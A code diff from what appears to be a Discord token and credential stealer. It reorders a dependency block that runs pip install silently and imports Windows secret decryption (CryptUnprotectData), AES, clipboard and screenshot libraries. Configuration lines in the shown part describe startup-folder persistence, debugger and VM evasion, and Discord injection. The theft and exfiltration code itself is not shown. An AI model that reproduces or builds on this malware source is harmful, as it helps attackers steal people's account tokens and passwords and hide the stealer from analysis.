@@ -31,6 +31,27 @@ Startup = '%Startup%' # If True, adds the file to the startup folder
 antidebugging = '%No_Debug%' # # If False, does not check for VM or debugger
 DiscordStop = '%Close%' # If True, prevents Discord from being launched again by removing content from the startup file. Note: this will disable injection.
 StartupMessage = 'Error while adding Trap into the startup folder' # DONT TOUCH / The message displayed if Startup is set to True
+import pkg_resources
+requirements = [
+    ["requests", "requests"],
+    ["Crypto.Cipher", "pycryptodome"],
+    ["win32clipboard", "pywin32"],
+    ["pypiwin32","pypiwin32"]
+]
+
+for modl in requirements:
+    try:
+        dist = pkg_resources.get_distribution(modl[1])
+    except pkg_resources.DistributionNotFound:
+        subprocess.call(['pip', 'install', modl[1]])
+        
+from win32crypt import CryptUnprotectData
+import requests
+from PIL import ImageGrab
+from ctypes import *
+from Crypto.Cipher import AES
+import win32clipboard
+
 
 def clear_command_prompt():
     if os.name == 'nt':
@@ -178,28 +199,6 @@ headers = {
 
 file_path = os.path.realpath(__file__)
 USER_NAME = getpass.getuser()
-import importlib
-import subprocess
-import pkg_resources
-
-requirements = [
-    ["requests", "requests"],
-    ["Crypto.Cipher", "pycryptodome"],
-    ["win32clipboard", "pywin32"],
-    ["Pillow", "Pillow"],
-]
-
-for modl in requirements:
-    try:
-        dist = pkg_resources.get_distribution(modl[1])
-    except pkg_resources.DistributionNotFound:
-        subprocess.call(['pip', 'install', modl[1]])
-        
-import requests
-from PIL import ImageGrab
-from ctypes import *
-from Crypto.Cipher import AES
-import win32clipboard
 
 
 class DATA_BLOB(Structure):
